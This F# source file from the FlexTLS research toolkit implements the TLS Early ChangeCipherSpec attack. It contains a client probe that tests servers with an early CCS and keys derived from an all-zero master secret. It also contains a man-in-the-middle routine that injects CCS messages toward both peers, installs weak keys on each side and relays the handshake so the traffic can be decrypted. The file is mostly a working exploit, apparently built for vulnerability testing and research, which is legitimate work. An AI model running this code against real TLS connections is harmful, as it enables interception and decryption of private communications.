(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_EarlyCCS

open Bytes
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexHandshake

type Attack_EarlyCCS =
    class

    static member client (server_name:string, ?port:int) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start TCP connection with the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Ensure we use RSA
        let fch = {FlexConstants.nullFClientHello with
            ciphersuites = Some([TLS_RSA_WITH_AES_128_CBC_SHA]) } in

        let st,nsc,fch   = FlexClientHello.send(st,fch) in
        let st,nsc,fsh   = FlexServerHello.receive(st,fch,nsc) in
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in

        // Inject early CCS and start encrypting early
        let st,_         = FlexCCS.send(st) in

        // We fill the master secret with zeros because it has no data from the KEX yet
        // Then we compute and install the writing secrets
        let epk          = { nsc.secrets with ms = (Bytes.createBytes 48 0)} in
        let nsc          = { nsc with secrets = epk} in
        let nscAtt       = FlexSecrets.fillSecrets(st,Client,nsc) in
        let st           = FlexState.installWriteKeys st nscAtt in

        // If this step go through, the peer is suceptible to the attack
        // It should throw a "Unexpected message" fatal alert because of the early CCS

        // We continue the usual handshake procedure
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,{nscAtt with secrets = FlexConstants.nullSecrets},fch) in

        let st,ffC       = FlexFinished.send(st,nsc,role=Client) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nscAtt in

        let st,ffS       = FlexFinished.receive(st,nsc,Server) in
        st

    static member runMITM (listen_addr, connect_addr:string, ?listen_port:int, ?connect_port:int) : state * state =
        let connect_port = defaultArg connect_port FlexConstants.defaultTCPPort in
        let listen_port = defaultArg listen_port FlexConstants.defaultTCPPort in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(listen_addr,connect_addr,listen_port=listen_port,server_cn=connect_addr,server_port=connect_port) in

        // Forward client Hello
        let sst,nsc,sch = FlexClientHello.receive(sst) in
        let cst     = FlexHandshake.send(cst,sch.payload) in

        // Forward server hello and control the ciphersuite
        let cst,nsc,csh   = FlexServerHello.receive(cst,sch,nsc) in
        if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name (FlexServerHello.getCiphersuite csh))) then
            failwith "Early CCS attack demo only implemented for RSA key exchange"
        else
        let sst = FlexHandshake.send(sst,csh.payload) in

        // Inject CCS to everybody
        let sst,_ = FlexCCS.send(sst) in
        let cst,_ = FlexCCS.send(cst) in

        // Compute the weak keys and start encrypting data we send
        let weakKeys      = { FlexConstants.nullSecrets with ms = (Bytes.createBytes 48 0)} in
        let weakNSC       = { nsc with secrets = weakKeys} in

        let weakNSCServer = FlexSecrets.fillSecrets(sst,Server,weakNSC) in
        let sst = FlexState.installWriteKeys sst weakNSCServer in

        let weakNSCClient = FlexSecrets.fillSecrets(cst,Client,weakNSC) in
        let cst = FlexState.installWriteKeys cst weakNSCClient in

        // Forward server certificate, server hello done and client key exchange
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        let sst,cst,_ = FlexHandshake.forward(sst,cst) in

        // Get the Client CCS, drop it, but install new weak reading keys
        let sst,_,_ = FlexCCS.receive(sst) in
        let sst   = FlexState.installReadKeys sst weakNSCServer in

        // Forward the client finished message
        let sst,cst,_ = FlexHandshake.forward(sst,cst) in

        // Forward the server CCS, and install weak reading keys on the client side
        let cst,_,_ = FlexCCS.receive(cst) in
        let cst   = FlexState.installReadKeys cst weakNSCClient in
        let sst,_ = FlexCCS.send(sst) in

        // Forward server finished message
        let cst,sst,_ = FlexHandshake.forward(cst,sst) in
        sst,cst
    end
